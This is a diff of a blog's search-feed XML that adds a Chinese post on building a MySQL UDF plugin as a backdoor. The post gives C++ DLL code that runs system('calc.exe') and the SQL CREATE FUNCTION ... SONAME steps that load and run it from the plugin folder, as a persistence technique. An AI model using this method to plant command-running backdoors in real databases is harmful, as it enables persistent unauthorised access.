@@ -3,6 +3,21 @@
   
     
     <entry>
+      <title>mysql插件(后门)开发</title>
+      <link href="/posts/657d3c49.html"/>
+      <url>/posts/657d3c49.html</url>
+      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>早上看到某文章讲数据库维权。此时，群内某dalao发话表示，用dll做插件加载也可以（滑稽）。那么下午弄个来康康<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1575376974715&amp;di=c5b680b0659d2f3295802edb960352f2&amp;imgtype=0&amp;src=http%3A%2F%2Fi0.hdslb.com%2Fbfs%2Farticle%2Ff38a65a18cad5d1b09691e6ad913f81f2913e6ee.jpg" alt=""></p><h2 id="0x01正文"><a href="#0x01正文" class="headerlink" title="0x01正文"></a>0x01正文</h2><p>环境：</p><pre><code>VS2015Mysql头部文件</code></pre><p>mysql头部文件下载：<a href="https://downloads.mysql.com/archives/c-c/" target="_blank" rel="noopener">MySQL :: Download MySQL Connector/C (Archived Versions)</a></p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jowl0u7sj31b50l7ad6.jpg" alt=""></p><p>创建一个静态DLL项目，然后引用外部文件（mysql-connector-c-6.1.11-winx64\include）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9joycgsulj30oq0nkdhz.jpg" alt=""></p><p>将mysql-connector-c-6.1.11-winx64\lib文件夹下的libmysql.lib和libmysql.dll复制到项目根目录<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp0u1kf6j30y60imjul.jpg" alt=""></p><p>引用lib，导入mysql.h开始写即可</p><pre><code class="c++">// ConsoleApplication1.cpp : 定义 DLL 应用程序的导出函数。//#include &quot;stdafx.h&quot;#include &lt;mysql.h&gt;#pragma comment(lib,&quot;libmysql&quot;) //引用lib文件extern &quot;C&quot; {    __declspec(dllexport) void udf_test() {        system(&quot;calc.exe&quot;);    }    __declspec(dllexport) my_bool udf_test_init() { //创建一个函数后要创建对应的 &quot;函数名_init()&quot;函数，不软会报错，如error.jpg        return 0;    }}</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp3ehglij30it0cat9h.jpg" alt="error.jpg"></p><p>编译环境选择Release x86,根据本机的环境不同而选择。如果x86生成出的dll加载错误就用x64生成在加载</p><p>将生成的dll放入mysql的\lib\plugin文件夹下<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp6g1gd5j30mz0ba74x.jpg" alt=""></p><p>自定义一个函数，和dll里相同的函数。在调用即可弹出calc</p><pre><code>CREATE FUNCTION udf_test RETURNS INTEGER SONAME &quot;dc.dll&quot;;select udf_test();</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g9jp83ayj9j30pl0lpdiy.jpg" alt=""></p><h2 id="0x02参考链接"><a href="#0x02参考链接" class="headerlink" title="0x02参考链接"></a>0x02参考链接</h2><p><a href="https://blog.csdn.net/albertsh/article/details/78567661" target="_blank" rel="noopener">mysql函数扩展之UDF开发</a><br><a href="https://blog.csdn.net/weixin_43134135/article/details/82391821" target="_blank" rel="noopener">windows+vs2017+C语言 引入mysql.h对MYSQL数据库的操作</a></p>]]></content>
+      
+      
+        <tags>
+            
+            <tag> 后门 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>简单的实现一个HTTP代理</title>
       <link href="/posts/2aaeb1.html"/>
       <url>/posts/2aaeb1.html</url>
